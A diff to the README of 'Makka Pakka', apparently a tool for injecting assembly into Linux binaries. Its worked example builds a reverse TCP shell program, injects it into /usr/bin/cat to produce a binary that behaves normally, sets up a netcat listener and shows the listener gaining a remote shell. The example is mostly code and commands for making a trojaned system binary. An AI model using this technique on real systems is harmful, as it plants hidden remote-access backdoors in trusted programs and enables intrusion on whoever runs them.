@@ -43,8 +43,8 @@ mkpk-transpile --help
 Usage: mkpk-transpile [OPTIONS] MKPK_FILEPATH
 
 Options:
--o, --output TEXT  The filepath to output the translated makka pakka code.
---help             Show this message and exit
+-o, --output TEXT  The filepath to output the transpiled makka pakka code to.
+--help             Show this message and exit.
 ```
 
 ``` bash
@@ -65,31 +65,33 @@ Options:
 ```
 
 ## Example
+This example shows how makka pakka can be used to inject a reverse TCP shell into
+a standard linux binary (/usr/bin/cat).
+
 Creating a Makka Pakka program file:
-```
+
 ----- reverse_tcp.mkpk -----
-!link stdlib/network.mkpk
-!link stdlib/syscall.mkpk
-!link stdlib/execve.mkpk
+```
+!link ../lib/stdlib/network.mkpk
+!link ../lib/stdlib/syscall.mkpk
+!link ../lib/stdlib/shell.mkpk
 
 [[data]]
-exit_msg: "Connection Terminated"
-# 5555 in little endian.
-port: 0xb315
-# 127.0.0.1 in little endian.
-addr: 0x0100007f
+PORT: 0xb315
+LOCALHOST_ADDR: 0x0100007f
 
 [[code]]
 [main]
-> socket
-> connect "addr" "port"
-> dup2
-> bin_sh
-> sys_write "exit_msg" 22
+> sys_socket ${AF_INET} ${SOCK_STREAM} 0x0
+mov r9, rax
+> sockaddr_init "LOCALHOST_ADDR" "PORT" ${AF_INET}
+> sys_connect r9 rsp 0x10
+> dup_stdstreams r9
+> bin_bash
 > sys_exit
 ```
 
-Compiling the Makka Pakka program into /usr/bin/echo:
+Compiling the Makka Pakka program into /usr/bin/cat:
 ```
 mkpk reverse_tcp.mkpk /usr/bin/cat -e -o cat_inject
 Injecting assembly from cat_inject.asm into cat_inject.
@@ -101,7 +103,7 @@ Setting up a listener on localhost:5555:
 nc -l localhost 5555
 ```
 
-Then run the injected cat binary:
+Then run the injected cat binary, it looks inconspicuous! but...
 ```
 ./cat_inject --help
 Usage: ./cat_inject [OPTION]... [FILE]...
@@ -132,7 +134,7 @@ Full documentation <https://www.gnu.org/software/coreutils/cat>
 or available locally via: info '(coreutils) cat invocation'
 ```
 
-Now the netcat listener has a remote TCP shell:
+Now the netcat listener has a remote TCP shell!
 ```
 nc -l localhost 5555
 whoami
@@ -186,7 +188,7 @@ source configure.sh
 
 At this point you can use Makka Pakka from within this directory.
 ``` bash
-python3 mkpk.py --help
+python3 src/mkpk.py --help
 ```
 
 For more examples, or a more detailed technical explaination, please check
